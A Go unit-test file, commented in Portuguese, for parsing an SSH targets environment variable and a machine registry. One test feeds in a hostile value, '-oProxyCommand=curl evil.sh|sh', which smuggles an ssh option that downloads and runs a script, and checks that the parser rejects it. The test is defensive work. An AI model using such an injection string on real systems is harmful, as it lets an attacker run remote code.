package machine

import "testing"

func TestParseSSHTargetsLeNomeEDestino(t *testing.T) {
	ms, warns := ParseSSHTargets("macbook=vx@192.0.2.20,macmini=remote-host")
	if len(warns) != 0 {
		t.Fatalf("avisos inesperados: %v", warns)
	}
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %d", len(ms))
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "vx@192.0.2.20" {
		t.Errorf("primeira máquina errada: %+v", ms[0])
	}
	if ms[0].Source != SourceEnv {
		t.Errorf("máquina do env deve ter Source=env, veio %q", ms[0].Source)
	}
	if ms[0].Port != 22 {
		t.Errorf("porta default deve ser 22, veio %d", ms[0].Port)
	}
}

func TestParseSSHTargetsAceitaTerceiroCampoComoRemoteCmd(t *testing.T) {
	ms, _ := ParseSSHTargets("macbook=vx@192.0.2.20=/Users/vx/.local/bin/claude")
	if len(ms) != 1 {
		t.Fatalf("esperava 1 máquina, veio %d", len(ms))
	}
	if ms[0].RemoteCmd != "/Users/vx/.local/bin/claude" {
		t.Errorf("remoteCmd errado: %q", ms[0].RemoteCmd)
	}
}

// Uma entrada ruim não pode derrubar as boas — o hub precisa subir mesmo com
// CUTUQUE_SSH_TARGETS meio torto.
func TestParseSSHTargetsIgnoraEntradaMalformadaSemPerderAsBoas(t *testing.T) {
	ms, warns := ParseSSHTargets("bom=vx@host, ,semigual,=sem-nome,vazio=")
	if len(ms) != 1 || ms[0].Name != "bom" {
		t.Fatalf("esperava só a entrada boa, veio %+v", ms)
	}
	if len(warns) != 3 {
		t.Errorf("esperava 3 avisos (semigual, =sem-nome, vazio=), veio %d: %v", len(warns), warns)
	}
}

// Defesa herdada do review da F5: um destino começando com "-" seria
// reinterpretado pelo ssh como opção (ex.: -oProxyCommand=curl...). Injeção.
func TestParseSSHTargetsRejeitaDestinoQueParecOpcaoDoSSH(t *testing.T) {
	ms, warns := ParseSSHTargets("mal=-oProxyCommand=curl evil.sh|sh")
	if len(ms) != 0 {
		t.Errorf("destino começando com '-' deve ser recusado, veio %+v", ms)
	}
	if len(warns) != 1 {
		t.Errorf("esperava 1 aviso, veio %v", warns)
	}
}

// Formato amigável para copiar/colar no .env: espaço ao redor de nome e
// destino não pode quebrar o parse.
func TestParseSSHTargetsTiraEspacosAoRedor(t *testing.T) {
	ms, _ := ParseSSHTargets(" macbook = user@host , macmini = host2 ")
	if len(ms) != 2 {
		t.Fatalf("esperava 2 máquinas, veio %+v", ms)
	}
	if ms[0].Name != "macbook" || ms[0].Dest != "user@host" {
		t.Errorf("primeira entrada não teve os espaços tirados: %+v", ms[0])
	}
	if ms[1].Name != "macmini" || ms[1].Dest != "host2" {
		t.Errorf("segunda entrada não teve os espaços tirados: %+v", ms[1])
	}
}

func TestParseSSHTargetsVazioNaoEhErro(t *testing.T) {
	ms, warns := ParseSSHTargets("   ")
	if len(ms) != 0 || len(warns) != 0 {
		t.Errorf("entrada vazia deve dar nada e nenhum aviso: %+v / %v", ms, warns)
	}
}

func TestRegistryGetEListPreservamAOrdemDoEnv(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "zulu", Dest: "a@b", Source: SourceEnv, Port: 22},
		{Name: "alfa", Dest: "c@d", Source: SourceEnv, Port: 22},
	})
	list := r.List()
	if len(list) != 2 || list[0].Name != "zulu" || list[1].Name != "alfa" {
		t.Errorf("List deve preservar a ordem do env, veio %+v", list)
	}
	m, ok := r.Get("alfa")
	if !ok || m.Dest != "c@d" {
		t.Errorf("Get(alfa) errado: %+v ok=%v", m, ok)
	}
	if _, ok := r.Get("naoexiste"); ok {
		t.Error("Get de máquina inexistente deve devolver ok=false")
	}
}

func TestNewRegistryPrimeiraOcorrenciaVence(t *testing.T) {
	r := NewRegistry([]Machine{
		{Name: "dup", Dest: "primeiro", Port: 22, Source: SourceEnv},
		{Name: "dup", Dest: "segundo", Port: 22, Source: SourceEnv},
	})
	if len(r.List()) != 1 {
		t.Fatalf("nome repetido deve entrar uma vez só: %+v", r.List())
	}
	if m, _ := r.Get("dup"); m.Dest != "primeiro" {
		t.Errorf("a primeira ocorrência deve vencer, veio %q", m.Dest)
	}
}
